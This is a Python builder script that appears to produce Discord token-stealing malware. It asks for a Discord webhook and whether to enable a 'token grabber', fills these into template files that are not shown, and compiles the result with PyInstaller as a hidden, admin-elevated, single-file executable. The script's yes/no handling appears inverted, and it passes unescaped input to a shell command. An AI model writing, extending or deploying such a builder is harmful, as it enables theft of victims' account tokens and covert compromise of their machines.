import subprocess
import os

user = str(os.environ["USERNAME"])

def compile(code, name):
    print("Creating main script...")
    f = open("main.py", "w")
    f.write(code)
    f.close()
    print("Compiling code...")
    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe main.py --uac-admin --onefile --noconsole --name " + name, shell=True)
    print("Compile complete!")

def main():
    name = input(str("Enter name for executable: "))
    discordname = input(str("Enter your Discord name and tag: "))
    webhook = input(str("Enter Discord webhook: "))
    tokengrabber = input(str("Do you want to enable the token grabber?\n1 yes\n2 no: "))
    with open("src\\withouttoken.py", "r") as file:
        filedata = file.read()
    with open("src\\withtoken.py", "r") as file:
        filedata2 = file.read()
    code = filedata.replace('yourname', discordname)
    code2 = filedata2.replace('yourname', discordname)
    code3 = code2.replace('webhook', webhook)
    code4 = code.replace('webhook', webhook)
    if tokengrabber == "2":    
        compile(code3, name)
    if tokengrabber == "1":
        compile(code4, name)

main()
